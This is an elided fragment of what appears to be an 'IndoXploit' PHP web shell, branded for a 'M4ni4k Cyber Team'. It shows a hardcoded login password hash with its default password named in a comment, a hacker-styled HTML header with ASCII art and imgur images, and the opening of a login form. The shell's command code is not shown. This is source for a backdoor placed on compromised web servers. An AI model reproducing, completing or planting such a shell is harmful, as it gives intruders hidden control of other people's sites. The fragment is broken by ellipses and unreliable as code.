...
$auth_pass = "b6d767d2f8ed5d21a44b0e5886680cb9"; // default: IndoXploit
$color = "#00ff00";
...
<html>
<head>
<link rel="shortcut icon" href="http://i.imgur.com/6u6GpYh.png">
<title>[ ! ] M4ni4k Cyber Team [ ! ]</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
<----'    `--' `.__,' \
      ...
      `--{__________)        \/
-->
<img src="http://i.imgur.com/6u6GpYh.png" height="520 width="520"></images>
	</pre>
</header>
<form method="post">
